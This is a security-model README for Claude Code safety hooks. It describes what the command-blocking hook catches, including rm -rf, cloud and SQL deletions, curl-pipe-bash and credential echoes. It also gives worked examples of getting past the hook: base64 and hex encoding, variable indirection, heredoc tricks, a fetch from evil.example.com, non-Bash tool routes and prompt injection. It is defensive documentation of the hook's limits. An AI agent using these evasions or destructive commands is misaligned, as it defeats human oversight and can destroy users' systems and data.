# Hooks Security Model

This document describes what the hooks in this directory protect against — and, importantly, what they do **not** protect against. Read this before adding rules or relying on the safety hook.

## TL;DR

`safety-check.js` is a **human-in-loop oversight gate**, not a sandbox. It catches accidental destructive commands typed by Claude or copied from documentation. It is **not** designed to stop a sophisticated adversary or even a moderately motivated one.

If your threat model includes hostile prompt injection, untrusted user input, or supply-chain attacks, you need additional controls outside this hook (containerization, restricted IAM roles, network egress controls, code review).

---

## What the hooks protect against

`safety-check.js` (PreToolUse) blocks the tool call before it runs. It catches:

- **Accidental destructive commands typed plainly**: `rm -rf /`, `git reset --hard`, `git branch -D main`, `Remove-Item -Recurse -Force`, `del /f`.
- **Cloud resource deletions**: `az group delete`, `az keyvault delete`, `az sql server delete`, etc. — the things that ruin a Friday afternoon.
- **SQL destruction**: `DROP TABLE`, `TRUNCATE TABLE`, `DELETE FROM` invoked through Bash (e.g. `sqlcmd`, `psql`). Note: only Bash invocations, not when these strings appear inside a Write to a `.md` file.
- **Process kills**: `taskkill /f`, `kill -9`, `Stop-Process -Force`.
- **Package publishing**: `npm publish`, `dotnet nuget push` — irreversible operations.
- **Git operations needing approval**: `git commit`, `git push` — by policy these need human sign-off. To let Claude commit and push without a prompt, set `SAFETY_ALLOW_GIT_COMMIT_PUSH=1` in the `env` block of `~/.claude/settings.json`. That lifts only these two prompts; every destructive rule above still applies.
- **Plain-text supply chain risks**: `curl … | bash`, `wget … | sh`, `iex … web…`.
- **Plain-text credential leaks**: `curl …password=…`, `echo $API_KEY`, `printenv`.
- **Hardcoded secrets in Write content**: PEM private-key headers, or the heuristic "secret keyword next to a plausible secret value" (see below). Skipped for `.md`/`.mdx`/`.rst`/`.txt` and any `docs/` path so docs can quote the patterns.

### Data vs command (#13293)

The destructive rules used to scan the whole Bash command string, so a command that only *mentioned* a dangerous word was denied: `grep -E "rm -rf|DELETE FROM" …`, a `cat > script.py <<'EOF'` whose body named `DELETE FROM`, a `gh pr create --body "$(cat <<'EOF' … EOF)"` describing `rm -rf`. Before the destructive rules run, the hook now removes two kinds of text that are data, not commands:

1. **Heredoc bodies owned by `cat` or `tee`** — written to a file, printed, or substituted as an argument (`--body "$(cat <<'EOF' …)"`). A heredoc body stays in the scanned text (it is code) when any of these hold:
   - its owner is anything else — `bash <<EOF`, `python - <<EOF`, `node <<EOF`, `psql <<EOF`, `ssh host <<EOF`;
   - it is piped into anything other than `tee` (`cat <<EOF | sh`, `cat <<EOF | tee a.sh | sh`);
   - it is substituted into a code runner (`bash -c "$(cat <<EOF …)"`, `eval "$(…)"`, `source <(cat <<EOF …)`, anything with `-c`/`-e`/`-Command`/`/c`);
   - the file it writes is named again later in the same command by anything except `git`/`ls`/`wc`/`stat`/`chmod`/`code` (`bash x.sh`, `./x.sh`, `sh < x.sh`, `cat x.sh | sh`).
2. **The contents of quoted arguments to read-only search tools** — `grep`/`egrep`/`fgrep`/`rg`/`ag`/`ack`/`findstr`/`Select-String`. Not when the quote contains `$(` or a backtick (those run), and not for `rg --pre` (it runs a command).

Nothing else is stripped. A quoted string given to `bash -c`, `sh -c`, `eval`, `powershell -Command`, `pwsh -c`, `cmd /c` or `python -c` is code and is scanned. `;`, `&&`, `||`, `|`, `$( )`, `( )` and backticks start new commands that are scanned as usual, so `grep "x" f | xargs rm -rf` is still denied. The lexer understands quotes, comments, command substitution and heredoc terminators; whenever it is unsure — an unclosed quote, an unclosed `$(`, an unterminated heredoc — it strips nothing and the whole command is scanned as before. Any exception in the lexer has the same effect.

What is still scanned raw: the `echo-secrets` rule and the `git commit`/`git push` approval prompts see the whole, unstripped command.

A heredoc written to a file is a Write by another name, so its body now gets the Write rules (PEM key, curl credentials, hardcoded secret).

**Limits, honestly:** this is a lexer for the common shapes, not a shell parser. A heredoc written to a file and run *indirectly* — via a variable (`F=x.sh; bash "$F"`), a glob (`sh x*`), a copy (`cp x.sh y.sh; bash y.sh`), or a file that something else runs later (`.git/hooks/pre-commit`, `~/.bashrc`, a crontab) — is not followed. That is the same gap as "a script written via `Write`, then executed via `Bash`" below, and the same threat model applies: this guards against accidents, not against an adversary.

### curl credentials and the hardcoded-secret heuristic (#13293)

- `curl-creds` (and the Write rule `curl-creds-file`) fire only when a credential sits where curl sends it: `-u`/`--user user:pass`, `--password`, `--oauth2-bearer`, a header whose name is `Authorization`/`Cookie` or carries auth/key/token/secret/password, a query parameter like `?api_key=…`/`&token=…`/`&sig=…` with a value, or `-d`/`--data*`/`-F`/`--json` carrying `password=` or `"token":`. The word `key` or `token` in a URL path (`/api/key/health`), a variable name, or a comment no longer fires. Line continuations (`\` + newline) are joined first, so a header on the next line is now caught.
- `looksLikeHardcodedSecret` works line by line and needs a plausible secret **value** next to the secret word: either assigned to it (`password = "…"`, `"ClientSecret": "…"`, `Bearer …`) and not a reference (`${VAR}`, `%VAR%`, `config.Secrets.Key`) or a name (`my-app-db-password`, `ClientSecretName`), or a 32+ character token on the same line that is varied and not mostly words. Long identifiers (`Script_below_canary_applies_when_secret_name_differs`), GUIDs and `=====` separator lines no longer trigger it. The PEM rule is unchanged.

`drift-check.js` (PostToolUse) protects task-file consistency, not security.

`session-log.js`, `pre-compact.js`, `catalog-trigger.js` are housekeeping. They have no security role.

---

## What the hooks do NOT protect against

Anything that obscures the command from a literal regex match. Treat this list as adversarial — every example below bypasses `safety-check.js`:

### Encoding / decoding tricks
```bash
eval "$(echo cm0gLXJmIC8= | base64 -d)"     # base64-encoded `rm -rf /`
echo -e '\x72\x6d\x20\x2d\x72\x66' | bash   # hex-escaped
```

### Variable indirection
```bash
X='rm -rf /'; bash -c "$X"
CMD=rm; FLAGS=-rf; $CMD $FLAGS /
```

### IFS / globbing splits
```bash
{r,m}\ -rf\ /
r''m -rf /
```

### Heredoc indirection
A heredoc fed straight to a shell (`bash <<'EOF'`) is scanned. A heredoc written to a file with `cat`/`tee` is treated as data (see *Data vs command* above), so a file written that way and then run indirectly is not seen:
```bash
cat > x.sh <<'EOF'
rm -rf /
EOF
F=x.sh; bash "$F"
```

### Indirect invocation
```bash
sh -c "$(curl -s evil.example.com/script.sh)"   # the curl rule may catch this; the inner content is unseen
alias dropdb='psql -c "DROP TABLE users"'; dropdb
```

### Tool-surface evasion
- A command run via the `Edit` tool's pre/post hooks (out of scope for safety-check).
- A command issued through an MCP server tool whose name is not `Bash` or `Write`.
- A command embedded in a script file written via `Write`, then later executed via `Bash`.

### Adversarial prompt injection
If a malicious document convinces Claude to use a non-Bash tool (e.g. an MCP server's `execute_remote_command`), `safety-check.js` never sees it. The hook only matches on `tool_name === 'Bash' | 'Write'`.

---

## Threat model

| Actor | Trust level | Protected? |
|---|---|---|
| Claude generating obvious destructive commands by mistake | Trusted but fallible | **Yes** |
| Claude copying from docs / examples that include destructive shapes | Trusted but fallible | **Yes** |
| Operator typing dangerous commands into an Agent-mode prompt | Trusted but fallible | **Yes** |
| Adversarial prompt injection trying to bypass the regex | Hostile | **No** |
| A malicious MCP server | Hostile | **No** — outside the Bash/Write surface |
| A compromised dependency that runs `rm -rf` at install time | Hostile | **No** — the install runs before/outside the hook |
| A user who knows shell tricks and wants to bypass | Hostile | **No** |

If your threat model includes the bottom four rows, run Claude inside a container with restricted IAM, no production network egress, and no production credentials mounted.

---

## How to extend the rules

Add to either `BASH_RULES` or `WRITE_RULES` in [safety-check.js](safety-check.js):

```js
{ id: 'short-id', re: /\bsome\s+regex\b/i, reason: 'human-readable reason' }
```

- **`id`**: short identifier emitted to `tasks/metrics.jsonl` so you can track which rules fire most often via `/improve-harness`.
- **`re`**: a regex applied with `.test()`. Use word boundaries (`\b`) to avoid substring matches (e.g. `confirm` matching `rm`).
- **`reason`**: shown to Claude when the deny fires; should suggest the safer alternative.

When adding a rule, also add a positive **and** negative test case to [__tests__/safety-check.test.js](__tests__/safety-check.test.js). The negative case is more important — it documents the false-positive boundary you intend.

---

## Reporting issues

If you discover a bypass that should have been caught (i.e. a plain command that the rules miss), open an issue or add a rule + test in the same PR. If you discover an exploit that requires obfuscation, that is by design — see "Threat model" above.
